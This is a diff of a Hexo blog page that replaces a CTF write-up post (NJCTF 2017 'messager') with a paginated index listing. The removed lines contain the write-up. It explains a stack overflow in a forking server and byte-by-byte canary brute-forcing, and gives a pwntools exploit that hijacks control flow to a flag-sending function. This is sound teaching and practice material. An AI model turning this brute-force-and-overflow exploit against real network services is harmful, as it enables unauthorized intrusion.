@@ -20,39 +20,30 @@
     var CONFIG = {"hostname":"dreamfo1l.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="知识点概述：栈溢出  fork子进程  爆破canary">
-<meta property="og:type" content="article">
-<meta property="og:title" content="NJCTF 2017 messager">
-<meta property="og:url" content="https://dreamfo1l.github.io/2021/05/23/NJCTF%202017message/index.html">
+  <meta name="description" content="独立之精神，自由之思想。">
+<meta property="og:type" content="website">
+<meta property="og:title" content="dreamfoil">
+<meta property="og:url" content="https://dreamfo1l.github.io/page/2/index.html">
 <meta property="og:site_name" content="dreamfoil">
-<meta property="og:description" content="知识点概述：栈溢出  fork子进程  爆破canary">
+<meta property="og:description" content="独立之精神，自由之思想。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.loli.net/2021/05/28/jSifFcBhVx1yJWN.png">
-<meta property="og:image" content="https://i.loli.net/2021/05/28/eR6chBvZulQ4tgG.png">
-<meta property="og:image" content="https://i.loli.net/2021/05/28/kOM2t8SyT9Vm3rv.png">
-<meta property="og:image" content="https://i.loli.net/2021/05/28/8kcyH79BaMGmNpS.png">
-<meta property="og:image" content="https://i.loli.net/2021/05/28/cnCeJiOoTy7W6am.png">
-<meta property="article:published_time" content="2021-05-23T08:17:07.000Z">
-<meta property="article:modified_time" content="2021-05-28T13:17:34.480Z">
 <meta property="article:author" content="dreamfoil">
-<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2021/05/28/jSifFcBhVx1yJWN.png">
 
-<link rel="canonical" href="https://dreamfo1l.github.io/2021/05/23/NJCTF%202017message/">
+<link rel="canonical" href="https://dreamfo1l.github.io/page/2/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : false,
-    isPost : true,
+    isHome : true,
+    isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>NJCTF 2017 messager | dreamfoil</title>
+  <title>dreamfoil</title>
   
 
 
@@ -155,10 +146,9 @@
         <div class="content-wrap">
           
 
-          <div class="content post posts-expand">
+          <div class="content index posts-expand">
             
-
-    
+      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -174,9 +164,10 @@
       <meta itemprop="name" content="dreamfoil">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          NJCTF 2017 messager
-        </h1>
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/23/NJCTF%202017message/" class="post-title-link" itemprop="url">NJCTF 2017 messager</a>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -206,47 +197,34 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id=""><a href="#" class="headerlink" title=""></a></h3><h5 id="知识点概述：栈溢出-fork子进程-爆破canary"><a href="#知识点概述：栈溢出-fork子进程-爆破canary" class="headerlink" title="知识点概述：栈溢出  fork子进程  爆破canary"></a>知识点概述：栈溢出  fork子进程  爆破canary</h5><span id="more"></span>
-
-<p>checksec<br><img src="https://i.loli.net/2021/05/28/jSifFcBhVx1yJWN.png" alt="image-20210528211004865"></p>
-<p>程序一开始就打开flag，把flag读到bss段（0x602160）<img src="https://i.loli.net/2021/05/28/eR6chBvZulQ4tgG.png" alt="image-20210528211154009"></p>
-<p>另外还有一个sendflag的函数，那么目标就是跳转到此函数<br><img src="https://i.loli.net/2021/05/28/kOM2t8SyT9Vm3rv.png" alt="image-20210528211225507"></p>
-<p>在这个while循环中，每发生连接，就fork一个子进程，子进程跳出循环。</p>
-<p><img src="https://i.loli.net/2021/05/28/8kcyH79BaMGmNpS.png" alt="image-20210528211243124"></p>
-<p>随后进入该函数，进行交互</p>
-<p><img src="https://i.loli.net/2021/05/28/cnCeJiOoTy7W6am.png" alt="image-20210528211257717"><br>这个函数有明显的栈溢出漏洞，接收了最大400个字节的数据</p>
-<p><strong>因为同一个进程fork的子进程canary是不变的，所以这里可以通过逐字节暴露突破canary</strong></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_canary</span>():</span></span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(canary)&lt;<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io = remote(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">5555</span>)</span><br><span class="line">                io.recv()</span><br><span class="line">                io.send(<span class="string">&#x27;A&#x27;</span>*<span class="number">104</span>+canary+<span class="built_in">chr</span>(i))</span><br><span class="line">                data = io.recvline()</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;Message&#x27;</span>) <span class="keyword">in</span> data:</span><br><span class="line">                    canary += <span class="built_in">chr</span>(i)</span><br><span class="line">                    log.info(<span class="string">&quot;get:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(i)))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span> </span><br><span class="line">            <span class="keyword">finally</span>: </span><br><span class="line">                io.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    io = remote(<span class="string">&quot;1.0.0.0&quot;</span>,<span class="number">5555</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    send_flag_addr = <span class="number">0x000400BC6</span></span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">104</span> + canary +<span class="string">&#x27;A&#x27;</span>*<span class="number">8</span> + p64(send_flag_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> io.recvline()   </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    leak_canary()</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+          <h3 id=""><a href="#" class="headerlink" title=""></a></h3><h5 id="知识点概述：栈溢出-fork子进程-爆破canary"><a href="#知识点概述：栈溢出-fork子进程-爆破canary" class="headerlink" title="知识点概述：栈溢出  fork子进程  爆破canary"></a>知识点概述：栈溢出  fork子进程  爆破canary</h5>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/05/23/NJCTF%202017message/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
     </div>
 
     
     
     
-
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item"></div>
-      <div class="post-nav-item">
-    <a href="/2021/05/24/%E4%BB%8E%E4%B8%80%E4%B8%AADLL%E5%88%86%E6%9E%90%E5%AE%9E%E4%BE%8B%E5%85%A5%E9%97%A8Windows%E5%8A%A8%E6%80%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" rel="next" title="从一个DLL分析实例入门Windows动态样本分析">
-      从一个DLL分析实例入门Windows动态样本分析 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
+        <div class="post-eof"></div>
       </footer>
-    
   </article>
   
   
   
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
 
 
 
@@ -298,7 +276,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A6%82%E8%BF%B0%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA-fork%E5%AD%90%E8%BF%9B%E7%A8%8B-%E7%88%86%E7%A0%B4canary"><span class="nav-text">知识点概述：栈溢出  fork子进程  爆破canary</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
